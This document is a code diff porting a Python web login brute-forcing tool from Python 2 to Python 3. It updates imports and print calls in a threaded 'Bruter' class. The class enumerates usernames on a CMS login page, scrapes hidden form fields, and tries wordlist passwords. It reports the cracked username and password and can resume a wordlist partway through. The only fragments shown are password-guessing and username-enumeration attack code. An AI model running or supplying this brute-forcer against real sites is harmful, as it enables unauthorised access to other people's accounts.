@@ -1,12 +1,10 @@
-import urllib2
 import urllib
-import cookielib
 import threading
 import sys
-import Queue
+import queue
 import requests
 
-from HTMLParser import HTMLParser
+from html.parser import HTMLParser
 
 
 class Bruter(object):
@@ -22,7 +20,7 @@ class Bruter(object):
         self.threads = user_threads
         self.unprobable_password = "/.,.,adsfasdkkkdfjlk3//.3.,,,.kjlksdf"
         self.discovered_usernames = []
-        print "Finished setting up Bruter object"
+        print("Finished setting up Bruter object")
         self.set_cms()
     
     def set_cms(self):
@@ -70,8 +68,8 @@ class Bruter(object):
             response = session.get(self.target_url)
             page = response.text
 
-            print "Trying: %s : %s (%d left)" % (self.username,brute,
-                    self.password_q.qsize())
+            print("Trying: %s : %s (%d left)" % (self.username,brute,
+                    self.password_q.qsize()))
             
             # parse out the hidden fields
             parser = BruteParser()
@@ -103,7 +101,7 @@ class Bruter(object):
             post_tags[self.username_field] = self.username
             post_tags[self.password_field] = brute
             #post_tags['wp-submit'] = 'submit'
-            login_data = urllib.urlencode(post_tags)
+            #login_data = urllib.urlencode(post_tags)
 
             login_response = session.post(self.target_post, data=post_tags)
 
@@ -115,10 +113,10 @@ class Bruter(object):
                 print("Username %s is valid"%self.username)
             if self.success_check in login_result:
                 self.found = True
-                print "[*] Bruteforce successful."
-                print "[*] Username: %s" % self.username
-                print "[*] Password: %s" % brute
-                print "[*] Waiting for other threads to exit..."
+                print("[*] Bruteforce successful.")
+                print("[*] Username: %s" % self.username)
+                print("[*] Password: %s" % brute)
+                print("[*] Waiting for other threads to exit...")
 
 
     def web_username_bruter(self):
@@ -132,7 +130,7 @@ class Bruter(object):
             response = session.get(self.target_url)
             page = response.text
 
-            print "Trying: %s (%d left)" % (brute, self.username_q.qsize())
+            print("Trying: %s (%d left)" % (brute, self.username_q.qsize()))
             
             # parse out the hidden fields
             parser = BruteParser()
@@ -177,7 +175,7 @@ class Bruter(object):
         raw_words = fd.readlines()
         fd.close()
         found_resume = False
-        words= Queue.Queue()
+        words= queue.Queue()
     
         for word in raw_words:
             word = word.rstrip()
@@ -187,7 +185,7 @@ class Bruter(object):
                 else:
                     if word == self.resume:
                         found_resume = True
-                        print "Resuming wordlist from: %s" % self.resume
+                        print("Resuming wordlist from: %s" % self.resume)
             else:
                 words.put(word)
     
